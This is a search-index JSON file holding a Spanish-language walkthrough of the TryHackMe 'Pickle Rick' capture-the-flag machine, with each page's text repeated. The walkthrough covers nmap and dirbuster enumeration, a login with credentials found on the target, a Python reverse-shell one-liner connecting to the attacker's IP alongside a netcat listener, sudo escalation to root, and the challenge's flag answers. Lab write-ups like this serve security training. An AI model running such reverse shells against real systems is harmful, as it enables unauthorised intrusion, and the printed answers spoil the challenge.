{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Pickle Rick En el Writeup de hoy estaremos viendo la M\u00e1quina Pickle Rick perteneciente a la plataforma de THM. Este desaf\u00edo tem\u00e1tico de Rick y Morty requiere que explotes un servidor web para encontrar 3 ingredientes que ayuden a Rick a hacer su poci\u00f3n para transformarse de nuevo en humano a partir de un pepinillo. Dificultad: F\u00e1cil. Important Vamooooosss a exploooootaaaaaarrrr !!!!","title":"Home"},{"location":"#pickle-rick","text":"En el Writeup de hoy estaremos viendo la M\u00e1quina Pickle Rick perteneciente a la plataforma de THM. Este desaf\u00edo tem\u00e1tico de Rick y Morty requiere que explotes un servidor web para encontrar 3 ingredientes que ayuden a Rick a hacer su poci\u00f3n para transformarse de nuevo en humano a partir de un pepinillo. Dificultad: F\u00e1cil. Important Vamooooosss a exploooootaaaaaarrrr !!!!","title":"Pickle Rick"},{"location":"enumeracion/","text":"Pickle Rick Primero comenzaremos realizando un scanning a nuestro target en nuestro caso la ip 10.10.199.221 . En este caso usaremos nuestro querido y amado NMAP, para realizar la primera fase de enumeraci\u00f3n. nmap -sS --min-rate=5000 -p- -Pn -n -vvv 10.10.199.221 -oG allports Info -sS >> Realizamos un Sync port scan, esto hace que el escaneo sea m\u00e1s r\u00e1pido debido a el m\u00e9todo que utiliza. --min-rate=5000 >> No emitir paquetes menores de 5000 por segundo. -p- >> Hacer scanning en todos los puertos 65535 . -Pn >> Esto es para skipear el host discovery. -n >> Para no hacer resoluci\u00f3n DNS. -vvv >> Indicamos un triple verbose , para que nos brinde informaci\u00f3n. -oG >> indicamos que el output del scanning se guardar\u00e1 en formato grep-peable en el fichero que especificamos. Estos fueron los puertos que se encontraron abiertos durante el escaneo: PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 61 80/tcp open http syn-ack ttl 61 Como vemos que tenemos el puerto 80/tcp abierto, de lejos nos indica a que puede ser una p\u00e1gina web, por lo tanto vamos a comprobar. Y... Efectivamente es una p\u00e1gina web, pudimos extraer informaci\u00f3n de la misma utilizando ciertos plugins dentro del navegador. La p\u00e1gina es la siguiente, y vemos que nos deja algunos hints dentro de ella. Vemos que hemos conseguido un User potencial. Username: R1ckRul3s Ahora para seguir haciendo un poco de enumeraci\u00f3n manual, accederemos al robots.txt, para verificar que existe, y efectivamente es as\u00ed, vemos que solo hay unas cu\u00e1ntas letras random, pero la tendremos aqu\u00ed, deber\u00e1n servir para algo: Wubbalubbadubdub Ahora procederemos a realizar un poco de fuzzing con dirpbuster , estos fueron los par\u00e1metros que utilizamos: dirbuster -l /usr/share/wordlists/rockyou.txt -e html,php -u http://10.10.199.221 Info -l para indicar el wordlist que usaremos. -e para indicar las extensiones que usaremos. -u para indicar nuestro target. Esperando unos segundos para el resultado nos encontramos con un portal de login que tiene la p\u00e1gina, con el nombre de login.php , tambi\u00e9n nos encontramos con un portal.php , pero este nos redirige a login.php.","title":"1. Enumeraci\u00f3n BB >_<"},{"location":"enumeracion/#pickle-rick","text":"Primero comenzaremos realizando un scanning a nuestro target en nuestro caso la ip 10.10.199.221 . En este caso usaremos nuestro querido y amado NMAP, para realizar la primera fase de enumeraci\u00f3n. nmap -sS --min-rate=5000 -p- -Pn -n -vvv 10.10.199.221 -oG allports Info -sS >> Realizamos un Sync port scan, esto hace que el escaneo sea m\u00e1s r\u00e1pido debido a el m\u00e9todo que utiliza. --min-rate=5000 >> No emitir paquetes menores de 5000 por segundo. -p- >> Hacer scanning en todos los puertos 65535 . -Pn >> Esto es para skipear el host discovery. -n >> Para no hacer resoluci\u00f3n DNS. -vvv >> Indicamos un triple verbose , para que nos brinde informaci\u00f3n. -oG >> indicamos que el output del scanning se guardar\u00e1 en formato grep-peable en el fichero que especificamos. Estos fueron los puertos que se encontraron abiertos durante el escaneo: PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 61 80/tcp open http syn-ack ttl 61 Como vemos que tenemos el puerto 80/tcp abierto, de lejos nos indica a que puede ser una p\u00e1gina web, por lo tanto vamos a comprobar. Y... Efectivamente es una p\u00e1gina web, pudimos extraer informaci\u00f3n de la misma utilizando ciertos plugins dentro del navegador. La p\u00e1gina es la siguiente, y vemos que nos deja algunos hints dentro de ella. Vemos que hemos conseguido un User potencial. Username: R1ckRul3s Ahora para seguir haciendo un poco de enumeraci\u00f3n manual, accederemos al robots.txt, para verificar que existe, y efectivamente es as\u00ed, vemos que solo hay unas cu\u00e1ntas letras random, pero la tendremos aqu\u00ed, deber\u00e1n servir para algo: Wubbalubbadubdub Ahora procederemos a realizar un poco de fuzzing con dirpbuster , estos fueron los par\u00e1metros que utilizamos: dirbuster -l /usr/share/wordlists/rockyou.txt -e html,php -u http://10.10.199.221 Info -l para indicar el wordlist que usaremos. -e para indicar las extensiones que usaremos. -u para indicar nuestro target. Esperando unos segundos para el resultado nos encontramos con un portal de login que tiene la p\u00e1gina, con el nombre de login.php , tambi\u00e9n nos encontramos con un portal.php , pero este nos redirige a login.php.","title":"Pickle Rick"},{"location":"explotacion/","text":"Pa dentrooooooooo !!!!! Sabemos que tenemos un usuario y una contrase\u00f1a potencial, as\u00ed que intentaremos. Username: R1ckRul3s Password: Wubbalubbadubdub Perfecto !!! hemos obtenido acceso. Tenemos varias secciones, pero si les soy sincero, me interesa m\u00e1s la de commands. Algo que podemos realizar es ver, si podemos ejecutar comandos directamente desde aqu\u00ed, daremos un ls, y vemos que podemos contestar la primera pregunta si hacemos un cat Sup3rS3cretPickl3Ingred.txt Vemos que la p\u00e1gina es un poco troll, y al hacer cat no nos deja, pues... lo que haremos es ver si podemos hacer ejecuci\u00f3n de otros binarios que nos puedan permitir una reverse shell, por ejemplo con python 3, si usamos el siguiente comando podemos comprobar: python3 -c \"print('Jamiel')\" Yupii !!!! Vemos que tenemos ejecuci\u00f3n, por lo tanto usaremos in oneliner con python3 que nos permitir\u00e1 ganar acceso a la m\u00e1quina directamente: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.2.54.248\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Para esto en paralelo tendremos que correr nuestro netcat en nuestra terminal: nc -lnvp 1234 Info Esto se tiene que hacer antes de ejecutar el onliner de python3 Una vez tengamos ready el el netcat , ejecutamos nuestro oneliner , recordar que tenemos que ajustar la ip y el puerto seg\u00fan nuestros requerimientos y pufff, hemos obtenido acceso al serv. Ahora si podemos ver el primer ingrediente mr. meeseek hair Una buena pr\u00e1ctica es ejecutar las siguientes lineas mostradas abajo, para poder crear una consola mucho m\u00e1s interactiva: script /dev/null -c bash control z stty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Ya que tenemos nuestra consola interactiva, procedemos a buscar nuestro segundo ingrediente. Primero buscaremos entre los archivos de la ruta /var/www/html, me encontr\u00e9 que el archivo clue.txt dice lo mostrado en la imagen. Pregunta-1 What is the first ingredient Rick needs? mr. meeseek hair Leido lo que dice el archivo, y deduciendo que es una m\u00e1quina easy, fuimos a home, encontramos un user llamado rick, accedemos a su dir y encontraremos al archivo que buscamos. Pregunta-2 Whats the second ingredient Rick needs? 1 jerry tear Por deducci\u00f3n, imagino que el tercer archivo debe estar dentro de root, pero para poder acceder a este dir necesitamos tener privilegios, uno de los comandos m\u00e1s comunes que tenemos que utilizar es \" sudo -i \" y efectivamente tenemos el root, ya podemos dirigirnos a /root y hacerle un cat a nuestro tercer archivo. Pregunta-3 Whats the final ingredient Rick needs? fleeb juice","title":"2. Explotando >_<"},{"location":"explotacion/#pa-dentrooooooooo","text":"Sabemos que tenemos un usuario y una contrase\u00f1a potencial, as\u00ed que intentaremos. Username: R1ckRul3s Password: Wubbalubbadubdub Perfecto !!! hemos obtenido acceso. Tenemos varias secciones, pero si les soy sincero, me interesa m\u00e1s la de commands. Algo que podemos realizar es ver, si podemos ejecutar comandos directamente desde aqu\u00ed, daremos un ls, y vemos que podemos contestar la primera pregunta si hacemos un cat Sup3rS3cretPickl3Ingred.txt Vemos que la p\u00e1gina es un poco troll, y al hacer cat no nos deja, pues... lo que haremos es ver si podemos hacer ejecuci\u00f3n de otros binarios que nos puedan permitir una reverse shell, por ejemplo con python 3, si usamos el siguiente comando podemos comprobar: python3 -c \"print('Jamiel')\" Yupii !!!! Vemos que tenemos ejecuci\u00f3n, por lo tanto usaremos in oneliner con python3 que nos permitir\u00e1 ganar acceso a la m\u00e1quina directamente: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.2.54.248\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Para esto en paralelo tendremos que correr nuestro netcat en nuestra terminal: nc -lnvp 1234 Info Esto se tiene que hacer antes de ejecutar el onliner de python3 Una vez tengamos ready el el netcat , ejecutamos nuestro oneliner , recordar que tenemos que ajustar la ip y el puerto seg\u00fan nuestros requerimientos y pufff, hemos obtenido acceso al serv. Ahora si podemos ver el primer ingrediente mr. meeseek hair Una buena pr\u00e1ctica es ejecutar las siguientes lineas mostradas abajo, para poder crear una consola mucho m\u00e1s interactiva: script /dev/null -c bash control z stty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Ya que tenemos nuestra consola interactiva, procedemos a buscar nuestro segundo ingrediente. Primero buscaremos entre los archivos de la ruta /var/www/html, me encontr\u00e9 que el archivo clue.txt dice lo mostrado en la imagen. Pregunta-1 What is the first ingredient Rick needs? mr. meeseek hair Leido lo que dice el archivo, y deduciendo que es una m\u00e1quina easy, fuimos a home, encontramos un user llamado rick, accedemos a su dir y encontraremos al archivo que buscamos. Pregunta-2 Whats the second ingredient Rick needs? 1 jerry tear Por deducci\u00f3n, imagino que el tercer archivo debe estar dentro de root, pero para poder acceder a este dir necesitamos tener privilegios, uno de los comandos m\u00e1s comunes que tenemos que utilizar es \" sudo -i \" y efectivamente tenemos el root, ya podemos dirigirnos a /root y hacerle un cat a nuestro tercer archivo. Pregunta-3 Whats the final ingredient Rick needs? fleeb juice","title":"Pa dentrooooooooo !!!!!"}]}